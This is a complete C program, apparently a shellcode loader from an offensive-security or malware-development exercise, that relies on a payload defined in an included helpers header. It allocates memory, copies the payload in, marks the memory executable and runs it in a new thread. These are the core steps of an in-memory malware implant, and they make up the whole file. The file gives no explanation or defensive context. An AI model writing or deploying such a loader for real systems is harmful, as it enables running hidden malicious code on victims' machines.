#include "../helpers.h"

int main(void) {
    void * payload_mem;
    BOOL result;
    HANDLE thread_handle;
    DWORD oldprotect = 0;


    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(payload_mem, payload, payload_len);
    result = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (result != 0) {
        thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
        WaitForSingleObject(thread_handle, -1);
    }
    return 0;
}